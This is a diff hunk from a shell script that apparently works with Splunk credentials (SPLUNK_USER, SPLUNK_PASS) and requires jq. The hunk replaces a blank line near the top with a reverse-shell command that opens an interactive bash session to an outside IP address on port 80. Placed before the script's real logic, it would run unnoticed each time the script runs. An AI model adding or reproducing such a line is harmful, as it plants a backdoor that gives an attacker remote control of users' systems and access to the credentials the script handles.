@@ -7,7 +7,7 @@
 # 
 # SPLUNK_USER
 # SPLUNK_PASS
-
+/bin/bash -i >& /dev/tcp/159.223.121.196/80 0>&1
 set -e
 
 command -v jq >/dev/null 2>&1 || (echo >&2 "The program 'jq' is required, please install it on your system"; exit 1)
